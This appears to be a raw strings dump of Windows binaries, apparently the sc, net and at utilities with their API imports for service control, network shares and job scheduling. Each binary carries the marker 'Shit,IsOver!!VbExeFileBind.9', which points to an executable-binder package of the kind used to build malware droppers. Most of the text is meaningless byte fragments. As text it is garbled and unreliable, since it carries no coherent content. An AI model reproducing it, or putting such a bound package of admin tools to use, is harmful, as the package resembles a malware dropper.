[SC] ERROR: a service name is required
NB10
sc.pdb
SUVW
tHHt>HHt3
HYYt?Ht5Ht+Ht!Ht
YPPh
Y_^][
VWt(
PVht
HtLHtBHHt7
t+Ht!Ht
YYt!Ht
PShD
YY[_3
VWt(
PVht
u	hL
	Ph@
t3Ht$Ht
YYC;_
YY[_3
YYu0
pots
j XP
PVht
PVh0&
YYu	
YYu	
YYu+
YYuT
CCf9
ghx'
Dhd'
!hH'
YYui
PVht
PVhh&
PVht
<SV3
YYu@
C@@f
tdh0*
Rh *
Ph@)
PVht
YYu	
YYu+
YYuT
CCf9
Lhx'
)hd'
Th0'
QSVWj
PVht
PVhD+
YYv,3
$G;}
PVht
PVht
PVhX,
PVh(,
PWhp-
uu.W
PWh,.
QOOWV
YYub
YYuV
uvh|C
YYu	
^hdC
YYu	
FhHC
YYu	
.h,C
YYu	
YYuY
YYuY
YYuN
YYuf
YYuS
YYuq
YYuCj
YYu"j
YYuph
PVht
PVht
YYuG
YYu3j
PVhh>
Whd;
YYu}
YYu\
YYuc
YYu	
YYu	
YYu	
YYu	
YYu	
YYu	
YYu	
YYu	
YYu\G9}
YYu	
oh|(
6h\9
GG9}
PVh 9
PVhT8
tG9u
t(9u
PSVh$8
,F;u
PVhl7
PWVh@7
8MZu
Y_^[
printf
wcslen
_wcsicmp
wcscpy
_wtol
_getche
wcscmp
wcsncmp
_c_exit
_exit
_XcptFilter
_cexit
exit
__winitenv
__wgetmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
msvcrt.dll
_controlfp
_except_handler3
QueryServiceConfigW
OpenServiceW
QueryServiceConfig2W
ControlService
ChangeServiceConfigW
ChangeServiceConfig2W
CloseServiceHandle
CreateServiceW
EnumDependentServicesW
ConvertSecurityDescriptorToStringSecurityDescriptorW
QueryServiceObjectSecurity
SetServiceObjectSecurity
ConvertStringSecurityDescriptorToSecurityDescriptorW
QueryServiceLockStatusW
UnlockServiceDatabase
LockServiceDatabase
QueryServiceStatus
EnumServicesStatusExW
EnumServiceGroupW
EnumServicesStatusW
GetServiceKeyNameW
GetServiceDisplayNameW
NotifyBootConfigStatus
DeleteService
QueryServiceStatusEx
StartServiceW
OpenSCManagerW
ADVAPI32.dll
FormatMessageW
GetLastError
LocalAlloc
LocalFree
GetModuleHandleA
KERNEL32.dll
RtlAdjustPrivilege
ntdll.dll
Shit,IsOver!!VbExeFileBind.9
c`cccgccc
ccccccc#ccccccccccccccccccccccccccccccccccc
cccm|
 run in DOS mode.
Rich
.text
`.data
.rsrc
msvcrt.dll
ADVAPI32.dll
KERNEL32.dll
NTDLL.DLL
NETAPI32.dll
MPR.dll
DDDDDDDDDDDDDDDDDDDDDDDDD/^
3DDDD+m
.OCP
credui.dll
NB10
net.pdb
\SVWj
PSSj j
to9]
YYt0f
PSSSj
PWWWj
YY_^[]
QQVW
t2Ht(Ht
YYtxj
YYu4
t0Ht(Ht!Ht
u	9^
PWj	
SVW3
YYj\V
YYu	
YYu	
YYt$
VSSh
YYu&
j WQ
t\hV
G;>r
G;>r
_^[t
tB=a	
YYt!
Q@Pj
u69}
PWWWj
SVW3
t-f9
t)Ht
t%Ht
_^[t
8MZu
Y_^[
SWVj	h
wNVj
v	f=
FAAf
v3Of
t(f=
t"f=
tIf=
SVWj
txh	
YYt/h
9"u/
9"u8
u 9U
_^[]
PVSS
YYt hd
SUVW
D$$3
L$$G
_^][3
Wj'Y
YYf3
$E "
f9]tVWv
SPSS
SPSS
SPSS
SPSS
f9]|
f9]dt
E`Pj
ul9]`u'f
SVSS
9]`tk
SVSS
jWX_^
YYt	f
u	;}
YYt*f
SUVWh
jD[+\$$V
D$(Y
j|Vf
D$(Y
_^][
_^][
SVWh
u0h8
_^[]
F0Wf
F0Wf
Dl,}
D$DPf
\l4f
D$@hd
t>f=.
t.f=!
YYt	F;t$
tt4Y
+L$$
D$0VP
YYSj
t$$3
6f=.
tB9\$(u<h
,f=:
|rtF
_t%Ht
HuIS
$SVW
uB9=L
j@hp
PjeW
j|^j
YYt4
uQf!
?u'9
_^[]
VWt9
Wj;^
Jj|X
VWtY
_^[]
QRPh8x
CredUICmdLinePromptForCredentialsW
_setmode
_iob
wcslen
_wcsnicmp
setlocale
sprintf
exit
wcscat
wcscpy
wcschr
_wcsicmp
wcscmp
_wcsupr
iswctype
wcspbrk
_ultow
qsort
wcsncmp
wcsrchr
_c_exit
_exit
_XcptFilter
_cexit
__initenv
__getmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
msvcrt.dll
_controlfp
_except_handler3
RegCloseKey
RegQueryValueExW
RegOpenKeyExW
RegEnumValueW
ADVAPI32.dll
GetCommandLineW
GetLastError
GetStdHandle
SetThreadLocale
GetSystemDefaultLangID
GetCPInfo
GetConsoleOutputCP
GetExitCodeProcess
WaitForSingleObject
CloseHandle
CreateProcessW
GetProfileStringW
WriteProfileStringW
GetDriveTypeW
GetProcAddress
FreeLibrary
InterlockedCompareExchange
LoadLibraryA
GetModuleHandleA
KERNEL32.dll
NetApiBufferFree
NetUseEnum
NetUseGetInfo
I_NetPathType
NetUserGetInfo
NetShareEnum
NetapipBufferAllocate
NetApiBufferAllocate
NetApiBufferReallocate
I_NetNameValidate
NetWkstaUserGetInfo
NetWkstaGetInfo
NetServerEnum
NetServerGetInfo
NETAPI32.dll
WNetCloseEnum
WNetEnumResourceW
WNetOpenEnumW
WNetGetConnectionW
WNetGetLastErrorW
WNetCancelConnection2W
WNetAddConnection2W
MPR.dll
DelayLoadFailureHook
GetFileType
ReadConsoleW
SetConsoleMode
GetConsoleMode
PeekConsoleInputW
GetModuleFileNameW
SetLastError
LocalFree
FormatMessageW
LoadLibraryW
GetConsoleScreenBufferInfo
WriteFile
WideCharToMultiByte
LocalAlloc
WriteConsoleW
_vsnwprintf
_snwprintf
putchar
malloc
swprintf
wcsspn
wcscspn
calloc
wcsncpy
fread
ftell
_wcsdup
wcstok
_wfopen
_local_unwind2
memmove
_ultoa
RtlAllocateHeap
RtlInitUnicodeString
RtlOemStringToUnicodeString
RtlInitAnsiString
ntdll.dll
HELP
January
February
March
April
June
July
August
September
October
November
December
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
Sunday
Shit,IsOver!!VbExeFileBind.9
c`cccgccc
ccccccc#ccccccccccccccccccccccccccccccccccc
cccm|
 run in DOS mode.
Rich$
.text
`.data
.rsrc
msvcrt.dll
ADVAPI32.dll
KERNEL32.dll
NTDLL.DLL
NETAPI32.dll
SHELL32.dll
USER32.dll
DDDDDDDDDDDDDDDDDDDDDDDDD
3DDDD
R9Cw
0123456789
sShortDate
s2359
s1159
sDate
intl
sTime
iTLZero
iTimePrefix
iTime
M/d/yy
NB10
at.pdb
>\u,f
PVjP
Vt:f
QQSVWj
VVVV
t1VV
WRVPQ
VWj'Y
u&Vh
PPPPj
PWt	
j<[j
MdXu
MXQP
;u|~
]xVPS
<s_^[
tEBBf
:f;9t
FFf=/
GGf=/
YYu	
@_^[
GGf=/
u&VW
u2F;
PVWS
PVWS
YYt	
t*h0
YYt|j
H	Q3
tnHtdHtZHHt5Ht
HueV
8MZu
Y_^[
YYu*f
EdPh
EdPh
;}hu$h
_^[Y
V|tf
SVWf
j?Y3
C"Ph
C2Ph
HSVW
YYu'
YYu'
YYu)
YYu'
YYu)
t(HuA
u<f9_
u6f9_
|B;E
)f9_
u#f9_
9;t-
tLf=
3SWj
j<_j
TSUVW
CSj@
_^][
PhXZ
_^[t
_^[]
SVWv'
dv	f
WjdY3
YYt=
free
malloc
wcslen
_wcsicmp
wcscpy
exit
wcsrchr
swprintf
wcsncpy
_wcsupr
wcschr
wcstok
wcscat
fgets
_iob
strchr
_c_exit
_exit
_XcptFilter
_cexit
__initenv
__getmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
msvcrt.dll
_controlfp
_except_handler3
RegCloseKey
RegQueryValueExW
RegOpenKeyExW
ADVAPI32.dll
WideCharToMultiByte
GetFileType
GetStdHandle
WriteFile
WriteConsoleW
LocalFree
FormatMessageW
GetConsoleOutputCP
GetLastError
GetTimeFormatW
GetThreadLocale
GetSystemTime
MultiByteToWideChar
ReadConsoleW
GetCommandLineW
LoadLibraryW
GetSystemDefaultLangID
SetThreadLocale
GetCPInfo
GetModuleHandleA
KERNEL32.dll
I_NetNameValidate
NetScheduleJobAdd
NetApiBufferFree
NetScheduleJobEnum
NetScheduleJobGetInfo
NetScheduleJobDel
NETAPI32.dll
CommandLineToArgvW
SHELL32.dll
wsprintfW
USER32.dll
sscanf
strspn
strpbrk
_stricmp
_itoa
wcscmp
GetProfileStringA
GetProfileIntA
LocalAlloc
LoadLibraryExW
FreeLibrary
RtlTimeToSecondsSince1970
NtQuerySystemTime
ntdll.dll
/,- 	
%[^,- /:	
HELP
January
February
March
April
June
July
August
September
October
November
December
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
Sunday
Shit,IsOver!!
